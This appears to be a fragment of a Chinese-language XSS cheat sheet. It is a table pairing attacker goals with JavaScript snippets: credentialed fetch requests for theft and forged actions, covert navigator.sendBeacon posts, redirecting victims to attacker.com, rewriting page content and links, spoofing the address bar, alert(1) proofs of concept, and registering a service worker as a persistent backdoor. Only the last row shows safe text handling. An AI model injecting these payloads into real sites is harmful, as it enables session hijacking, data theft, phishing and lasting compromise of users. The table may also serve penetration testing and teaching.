| 发起 GET 请求（窃取） | `fetch(url, {credentials:'include'})` 或 `new Image().src = url` |
| 发起 POST 请求（操作） | `fetch(url, {method:'POST', credentials:'include', body:...})` |
| 发起隐蔽 POST（不关心响应） | `navigator.sendBeacon(url, data)` |
| 重定向受害者 | `location.href = 'https://attacker.com'` |
| 修改页面内容 | `document.body.innerHTML = '...'` |
| 修改所有链接 | `document.querySelectorAll('a').forEach(a => a.href = '...')` |
| 修改地址栏（不刷新） | `history.pushState({}, '', '/fake-url')` |
| 弹出 PoC 验证 | `alert(1)` 或 `print()`（Chrome 跨源 iframe） |
| 注册持久化后门 | `navigator.serviceWorker.register('/sw.js')` |
| 创建新元素 | `document.createElement('img')` |
| 安全地写入文本 | `element.textContent = userInput` |
